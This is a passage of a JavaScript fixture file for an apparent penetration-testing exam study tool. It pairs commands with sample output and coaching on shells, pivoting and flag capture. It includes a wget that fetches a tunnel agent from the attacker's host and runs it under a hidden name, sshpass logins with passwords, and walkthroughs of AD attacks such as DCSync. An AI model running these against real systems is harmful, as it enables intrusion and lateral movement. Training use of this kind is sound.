          'www-data@target:/$',
          '# now press Ctrl-Z to background this shell',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: 'stty raw -echo; fg', output: [
          'rlwrap nc -lvnp 4444',
          'www-data@target:/$ export TERM=xterm',
        ].join('\n') },
      ],
    },
    'linux-remote-exec': {
      why: "Pick this over a reverse shell whenever you already hold working creds: it is faster, scriptable, and does not depend on a fragile callback staying alive. Each command is its own clean, logged call, perfect for firing off a batch of enumeration (id, sudo -l, a SUID sweep) and reading the answers back without babysitting a session. The sudo line in that output is the lead to watch, a member of the sudo group is often one step from root.",
      cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
      output: [
        'uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)',
      ].join('\n'),
      signal: 'uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)',
      teach: 'Once you have a password, you can run a single command over SSH non-interactively, handy for scripted checks. The sudo group in bob\'s id output is a privesc lead: a sudo-group user can often get root directly.',
    },

    // ============================ PIVOTING & TUNNELING ============================
    'local-linux-interfaces': {
      why: "Before you can pivot you need to know what the foothold can see, and a second network interface is the clearest sign of a network behind this host that you cannot reach directly. Reach for it right after landing a Linux shell, as part of orienting. A box with one NIC is a dead end for pivoting; a box with two is a doorway, and this is how you tell which you have.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
      output: [
        '2: eth0    inet 10.10.10.10/24 scope global eth0',
        '3: eth1    inet 172.16.5.10/24 scope global eth1',
      ].join('\n'),
      signal: '3: eth1    inet 172.16.5.10/24 scope global eth1',
      teach: 'A compromised host with a second NIC is a doorway. eth1 on 172.16.5.0/24 is a network you could not reach before, the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
    },
    'local-linux-routes': {
      why: "The routing table on a foothold names the networks this host knows how to reach, which are your candidate targets for a tunnel. Reach for it alongside the interface check when you suspect there is more network behind the box. It keeps your pivoting honest: the routes tell you which subnets actually exist, so you build toward something real instead of guessing.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
      output: [
        'default via 10.10.10.1 dev eth0',
        '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      ].join('\n'),
      signal: '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      teach: 'The routing table shows which networks this host reaches directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
    },
    'local-linux-neighbors': {
      why: "The ARP neighbor cache lists hosts this box has recently talked to on its local segments, a weak but genuine hint about live internal machines. Reach for it when orienting a foothold for a pivot. It is not authoritative (caches age out), but a populated ARP table points you at real neighbors to validate once the tunnel is up, which beats scanning a whole subnet blind.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
      output: [
        '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
        '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
      ].join('\n'),
      signal: '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
      teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment, live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
    },
    'local-linux-dns': {
      why: "Note the internal nameservers early, they are a target and a map at once. An internal DNS server usually knows every hostname in the estate, so once a tunnel reaches it you can enumerate the whole environment by name instead of sweeping address ranges blind. The search domain tells you what you landed in, acme.internal points straight at an AD estate, so record both while you still hold the shell.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
      output: [
        'search acme.internal',
        'nameserver 172.16.5.5',
      ].join('\n'),
      signal: 'nameserver 172.16.5.5',
      teach: 'The internal DNS server and search domain tell you this host lives in acme.internal and resolves via 172.16.5.5, likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the network by name.',
    },
    'local-windows-interfaces': {
      why: "Same orientation step as on Linux, from a Windows WinRM foothold: extra NICs, DNS servers, or subnets signal a network behind this host worth pivoting into. Reach for it right after landing on Windows. In AD environments especially, the second interface frequently faces the internal server segment where the domain controllers and the real targets live.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 10.10.10.20',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box, the reason to pivot. Map the interfaces first; they define what is now in range.',
    },
    'local-windows-routes': {
      why: "So your pivot aims at real segments and not guesses, read the route table while orienting. Each entry on the internal NIC is a network this box already reaches and yours cannot, which is exactly what a tunnel would open up. Pair it with the interface check: together they tell you whether there is anything behind the host worth tunnelling toward at all.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
        'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box, your pivot target.',
    },
    'local-windows-neighbors': {
      why: "Treat the ARP cache as a free, no-scan list of live neighbours: these are machines the foothold actually exchanged packets with, so they are confirmed up on the internal segment. Read it while orienting, then start your post-tunnel enumeration from these known hosts rather than a cold sweep of the whole range. Entries age out, so copy them down before the cache turns over.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.30   00-0c-29-44-55-66  dynamic',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
      teach: 'The Windows ARP cache lists internal hosts this box has communicated with, confirmed-alive targets on the far side, found without sending a scan packet. Start your internal enumeration from these.',
    },
    'local-windows-listeners': {
      why: "The listening sockets on a Windows foothold show which services run locally, including ones bound only to localhost that you could reach through a port-forward. Reach for it when deciding what to tunnel. A service on 127.0.0.1 is invisible from the network but wide open to you on the box, and forwarding its port is often the cleanest way in to it.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
        'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      teach: 'A service bound to 127.0.0.1 is reachable only from the box itself, like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
    },
    'pivot-chisel-socks': {
      why: "Pick chisel when the host cannot accept inbound connections, which is the normal case behind a firewall. The agent dials back out to you, so the proxy forms even when nothing from outside can reach the box, and that is the whole reason to choose a reverse tunnel over a forward one. Use it once you have proven there is a segment you cannot touch directly; afterwards proxychains carries your tooling onto it.",
      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
      teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
      steps: [
        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
          'server: Reverse tunnelling enabled',
          'server: Listening on http://0.0.0.0:8080',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the chisel binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', output: [
          "Saved '/tmp/chisel' [8577024/8577024]",
          'client: Connected to http://10.10.14.5:8080',
          'client: tun: proxy#R:127.0.0.1:1080=>socks',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-ligolo': {
      why: "Choose this when you are tired of wrapping every command in proxychains. Because it presents the pivot as a real interface on your box, your tools hit the internal range natively, SYN scans, full connect behaviour, everything a SOCKS proxy quietly breaks. It is the fast, clean option once you have a foothold that can call back; the trade is one extra agent binary to stage on the target.",
      signal: '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet, fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
      steps: [
        { where: 'local', tool: 'ligolo-proxy', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', output: [
          'ligolo-proxy » Listening on 0.0.0.0:11601 (self-signed TLS)',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the Linux "agent" binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/agent -O /tmp/.a && chmod +x /tmp/.a && /tmp/.a -connect 10.10.14.5:11601 -ignore-cert', output: [
          "Saved '/tmp/.a' [8724234/8724234]",
          'time="10:41:07" level=info msg="Connection established" addr="10.10.14.5:11601"',
        ].join('\n') },
        { where: 'local', tool: 'ligolo-proxy', cmd: 'session   # select the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
          'ligolo-proxy » [Agent] joined from 10.10.10.20 (ACME\\WS01)',
          '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
        ].join('\n') },
      ],
    },
    'pivot-sshuttle': {
      why: "Reach for this the moment the pivot host is Linux with SSH and you hold a key or password, it is the lowest-friction tunnel that exists. Nothing is uploaded to the target and nothing wraps your commands; traffic to the internal subnet simply routes over the session you already have. The one requirement is real SSH access, so it is the natural first choice on a Linux foothold where you recovered credentials.",
      cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
      output: 'c : Connected to server.',
      signal: 'c : Connected to server.',
      teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone, no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
    },
    'pivot-ssh-dynamic': {
      why: "When you already hold SSH creds and want a tunnel without uploading a thing, this is usually all you need. A single flag turns the session into a SOCKS proxy; point proxychains at it and your tools reach the internal network through the box. It is the minimalist cousin of sshuttle, so choose it when you specifically want a SOCKS endpoint (for proxychains or a browser) rather than a transparent route.",
      signal: 'socks5 127.0.0.1 1080',
      teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy, the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
      steps: [
        { where: 'local', tool: 'ssh', cmd: 'ssh -D 1080 -N bob@10.10.10.10', output: '# SSH SOCKS proxy now listening on 127.0.0.1:1080 (leave this session open)' },
        { where: 'local', tool: 'sh', cmd: 'grep -i socks /etc/proxychains4.conf', output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-scan-through': {
      why: "The habit that saves everyone grief: through a proxy you must force a TCP connect scan (-sT) and skip host discovery (-Pn), because SYN scans and ICMP pings never survive a SOCKS hop and a normal nmap just hangs. Run it the instant a tunnel comes up, so enumeration restarts one network deeper against whatever the internal host is really running. Expect it to be slow, a proxied scan trades speed for reach.",
      cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
      output: [
        'Nmap scan report for 172.16.5.20',
        'PORT    STATE SERVICE',
        '445/tcp open  microsoft-ds',
        '3389/tcp open ms-wbt-server',
      ].join('\n'),
      signal: '445/tcp open  microsoft-ds',
      teach: 'Through a SOCKS proxy you must use TCP connect scans (-sT) and skip host discovery (-Pn), SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts again, one network deeper.',
    },

    // ============================ FLAGS & PROOF ============================
    'flag-hunt-linux': {
      why: "The flags are the objective: reading them is how you prove the box is yours, and on the exam a flag you cannot screenshot is a flag you did not capture. Reach for it once you hold the access the flag requires (user flag with a user shell, root flag with root). The discipline that matters is proof: read the flag in a shell you can screenshot showing your access, because OffSec scores a flag grabbed remotely without that context as zero.",
      cmd: "find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null", tool: 'sh',
      output: [
        '/home/bob/user.txt',
        '/root/root.txt',
      ].join('\n'),
      signal: '/root/root.txt',
      teach: 'The flags are the point: user.txt in a home directory, root.txt under /root. Capture both, and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
    },
    'flag-hunt-windows': {
      why: "Same objective on Windows: read the flag files to prove the compromise, and print each one next to `ipconfig` so a single screenshot shows both the flag and the host it came from. Reach for it once you hold the required access. The exam scores proof, not just the string, so capture the flag inside an interactive session on the target with your identity and the host's IP visible, that screenshot is what earns the points.",
      cmd: 'nxc smb 10.10.10.10 -u administrator -H <nthash> --spider C$ --regex "(proof|user|root)\\.txt"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  TARGET  //C$/Users/bob/Desktop/user.txt',
        'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      teach: 'On Windows the flags sit on the Desktops, user.txt for the low-priv user, proof.txt (or root.txt) for Administrator. Grab both, and capture whoami, hostname, and ipconfig alongside the flag so your screenshot proves the compromise.',
    },

  };

  // --- retrieval-practice metadata (the "Your turn" gear) ------------------------------------
  // Kept separate from the sample output so each move's (command, output) pair stays obvious. The
  // verdict for each choice is computed in study.js from the real requires; only the choice set and
  // nuance coaching live here. Merged onto the fixtures above.
  var PRACTICE = {
    "ajp-ghostcat": {"situation": "A scan shows 8009/tcp (ajp13) open next to a Tomcat 9.0.30 on 8080. What is the move?", "choices": ["ajp-ghostcat", "tomcat-deploy", "content-discovery", "check-log4shell"], "coach": {"tomcat-deploy": "That needs manager credentials you do not have; Ghostcat on the exposed AJP port reads files (maybe a config with those very creds) without logging in.", "content-discovery": "Fuzzing 8080 is fine in parallel, but the exposed AJP connector is a specific, version-matched bug, read WEB-INF first.", "check-log4shell": "Only if the app logs attacker input to a vulnerable Log4j; the AJP connector in front of you is the concrete, confirmed exposure."}},
    "java-rmi": {"situation": "A scan shows 1099/tcp (java-rmi) open and rmi-dumpregistry lists a bound name 'jmxrmi'. What now?", "choices": ["java-rmi", "check-log4shell", "nmap-vuln-scripts", "jenkins-access"], "coach": {"check-log4shell": "Different Java bug entirely; here you have an RMI registry, so test whether it deserializes attacker objects with rmg.", "nmap-vuln-scripts": "You already dumped the registry; the specific move is rmg enum to confirm deserialization, not a generic vuln scan.", "jenkins-access": "Only if there is a Jenkins on HTTP; the exposed service here is the RMI registry on 1099."}},
    'nmap-fast-open-ports': { situation: 'You have a target IP and nothing else. Where do you start?', choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'], coach: { 'nmap-version-scripts': 'That is the right follow-up, but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.', 'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.', 'recon-web-triage': 'Same, triage the web only after a scan confirms a web port is there.' } },
    'nmap-version-scripts': { situation: 'Your fast scan found 22, 80 and 445 open. What next?', choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'], coach: { 'recon-web-triage': 'Good instinct, and valid, but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.', 'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.', 'nmap-fast-open-ports': 'Already done, you have the open ports. Now get the versions behind them.' } },
    'recon-smb-anon': { situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?', choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'], coach: { 'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.', 'nmap-version-scripts': 'You already know the service; now actually enumerate it.' } },
    'recon-web-triage': { situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?', choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'], coach: { 'content-discovery': 'That comes next, but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).', 'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.' } },
    'ad-dc-identify': { situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.', choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'], coach: { 'ad-anon-ldap-enum': 'That is the right next step, but only once you have confirmed this is the DC and captured the domain name. First, name the target.', 'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.', 'dcsync': 'DCSync replicates every hash, it needs Domain Admin. This is the endgame, not the opening.' } },
    'ad-anon-ldap-enum': { situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.', choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'], coach: { 'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.', 'password-spray': 'Spraying also needs the user list first, same prerequisite.', 'dcsync': 'Needs Domain Admin. Far too early.' } },
    'asrep-roast': { situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.', choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'], coach: { 'password-spray': 'Also valid off the user list, but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.', 'kerberoast': 'Kerberoasting needs valid credentials to request service tickets, you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.', 'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.' } },
    'crack-asrep': { situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.', choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'], coach: { 'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.', 'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential, you are not there yet.', 'dcsync': 'Still needs Domain Admin. One cracked user is not that.' } },
    'password-spray': { situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.', choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'], coach: { 'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.', 'kerberoast': 'Still needs valid creds, which is exactly what the spray is trying to get you. Spray first, then roast service accounts.', 'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.' } },
    'ad-acl-abuse': { situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.', choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'], coach: { 'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege, walk the ACL path rather than gambling on a crackable service ticket.', 'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.', 'asrep-roast': 'You are well past the no-creds opening now, you already have a credential and a path.' } },
    'dcsync': { situation: 'An ACL path escalated you to a principal with domain replication rights.', choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'], coach: { 'ad-acl-abuse': 'That was the previous step, the one that got you the replication rights. You are past it now.', 'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.', 'password-spray': 'Far beneath where you are now, you hold replication rights over the whole domain.' } },
    'content-discovery': { situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.', choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'], coach: { 'param-discovery': 'That comes after you have pages to test, first discover the endpoints, then fuzz each one for hidden parameters.', 'lfi-probe': 'You can only probe a parameter you have found. Map the site first.', 'recon-web-triage': 'Already done, you know the stack. Now enumerate its content.' } },
    'param-discovery': { situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.', choices: ['param-discovery', 'lfi-probe', 'content-discovery'], coach: { 'lfi-probe': 'You need a parameter to probe first, view.php showed none, so fuzz for hidden ones before testing traversal.', 'content-discovery': 'You already have the endpoint; now find its inputs.' } },
    'lfi-probe': { situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?', choices: ['lfi-probe', 'file-upload', 'param-discovery'], coach: { 'file-upload': 'Different vector, only if there is an upload form. The page= parameter is begging for a traversal test first.', 'param-discovery': 'You already have the parameter; now exploit it.' } },
    'file-upload': { situation: 'An upload form accepts files and you can reach /uploads/ in your browser.', choices: ['file-upload', 'web-shells', 'lfi-probe'], coach: { 'web-shells': 'That is the very next step, once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.', 'lfi-probe': 'A different vector; you have a working upload path, so use it.' } },
    'web-shells': { situation: 'You have code execution through a webshell but it is clunky, one command per request.', choices: ['web-shells', 'linux-enum', 'file-upload'], coach: { 'linux-enum': 'Right idea for after you have a proper shell, but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.', 'file-upload': 'Already done, the upload gave you the webshell you are now upgrading.' } },
    'linux-enum': { situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?', choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'], coach: { 'sudo-abuse': 'You cannot know your sudo rights until you enumerate, run the sweep (or sudo -l) first, then act on what it shows.', 'suid-gtfobins': 'Same, enumerate to find which SUID binaries exist before trying to abuse one.', 'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.' } },
    'sudo-abuse': { situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.', choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'], coach: { 'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path, take the sure thing.', 'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.', 'linux-enum': 'Already done, enumeration is what handed you this sudo lead.' } },
    'suid-gtfobins': { situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.', choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'], coach: { 'sudo-abuse': 'There are no sudo rights here, that path is closed. The SUID bit on a GTFOBins binary is the open door.', 'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.' } },
    'pspy-monitor': { situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.', choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'], coach: { 'cron-abuse': 'That is the payoff, but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.', 'suid-gtfobins': 'Already checked, no usable SUID binary. Watch the process list instead.' } },
    'cron-abuse': { situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.', choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'], coach: { 'pspy-monitor': 'That was how you found the job, you are past it. Now abuse the writable script the job runs.', 'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.' } },
    'windows-enum': { situation: 'You have a shell as a low-privilege service account on Windows. First move?', choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'seimpersonate': 'You cannot know you hold SeImpersonate until you check, enumerate privileges first, then fire the potato.', 'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.', 'alwaysinstallelevated': 'Same, it only works if both registry keys are set. Enumerate to confirm before acting.' } },
    'seimpersonate': { situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.', choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'], coach: { 'unquoted-service-path': 'A valid alternative if one exists, but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.', 'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.', 'windows-enum': 'Already done, that is what told you SeImpersonate is enabled.' } },
    'unquoted-service-path': { situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.', choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'], coach: { 'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly, here the win is the writable directory in the unquoted path.', 'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.' } },
    'weak-service-permissions': { situation: 'accesschk shows your group has write access to a service configuration.', choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly, simpler.', 'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.' } },
    'alwaysinstallelevated': { situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.', choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'], coach: { 'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.', 'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.' } },

    'vhost-discovery': { situation: 'The web port answers, but the page is a generic default and triage hinted the box serves content by hostname.', choices: ['vhost-discovery', 'content-discovery', 'recon-web-triage', 'nikto-scan'], coach: { 'content-discovery': 'Directory brute-forcing the default page finds nothing if the real app only answers to a hostname. Find the vhost first, then enumerate it.', 'recon-web-triage': 'Already done, that is what flagged the placeholder page. Now ask the server which hostnames it actually serves.', 'nikto-scan': 'Nikto audits whatever host you point it at. Point it at the right vhost first, or it just scans the placeholder.' } },
    'nikto-scan': { situation: 'You have fingerprinted the stack and mapped a few paths. You want a fast sweep for known-bad files and server misconfigurations.', choices: ['nikto-scan', 'content-discovery', 'check-web-headers', 'sqli-basics'], coach: { 'content-discovery': 'That finds paths; nikto flags outdated software, default files and dangerous methods. Run the quick vuln sweep now to catch what a dir brute-force will not name.', 'check-web-headers': 'A narrower check. Useful, but nikto covers headers plus the rest in one pass, so start broad.', 'sqli-basics': 'Too specific this early. Let the broad scanner point you at suspicious endpoints, then test those for injection.' } },
    'sqli-basics': { situation: 'A product page loads with ?id=5 and you suspect the value drops straight into a SQL query.', choices: ['sqli-basics', 'manual-sqli-exploitation', 'sqlmap-automation', 'param-discovery'], coach: { 'manual-sqli-exploitation': 'That is the payoff once a vuln is confirmed. First prove the parameter is injectable with a quick quote or boolean test; do not start extracting before you know you can.', 'sqlmap-automation': 'Pointing sqlmap at an unconfirmed parameter is slow and noisy. A manual true/false test confirms the bug in seconds, then automate if you like.', 'param-discovery': 'You already have the parameter. Now test whether it is injectable.' } },
    'manual-sqli-exploitation': { situation: 'You confirmed an error-based injection on ?id= and automated tools are off the table for this box.', choices: ['manual-sqli-exploitation', 'sqlmap-automation', 'sqli-basics', 'content-discovery'], coach: { 'sqlmap-automation': 'That is the automated version of exactly this. When the engagement bans automated tooling (or you are learning the mechanics), walk the UNION or error extraction by hand.', 'sqli-basics': 'Already done, you confirmed the injection. Now extract data through it.', 'content-discovery': 'Wrong vector, you already hold a working injection point. Use it.' } },
    'sqlmap-automation': { situation: 'You manually confirmed a blind, time-based injection, there is a lot to dump, and automated tooling is allowed here.', choices: ['sqlmap-automation', 'manual-sqli-exploitation', 'sqli-basics', 'content-discovery'], coach: { 'manual-sqli-exploitation': 'Fine for a single value, but blind time-based extraction by hand is hundreds of requests per row. Let sqlmap grind it.', 'sqli-basics': 'Already confirmed. You are past proving it; now dump efficiently.', 'content-discovery': 'Wrong direction. You have a working injection; exploit it rather than hunting more pages.' } },
    'git-exposed': { situation: 'Content discovery returned a 200 on /.git/ and the directory is browsable.', choices: ['git-exposed', 'svn-exposed', 'content-discovery', 'lfi-probe'], coach: { 'svn-exposed': 'Same idea for a different version-control system; reach for that when you see /.svn/. Here it is /.git/, so reconstruct the repo.', 'content-discovery': 'That is how you found /.git/. Now dump it and read the recovered source.', 'lfi-probe': 'Different vector. An exposed repo hands you source and secrets directly, no traversal needed.' } },
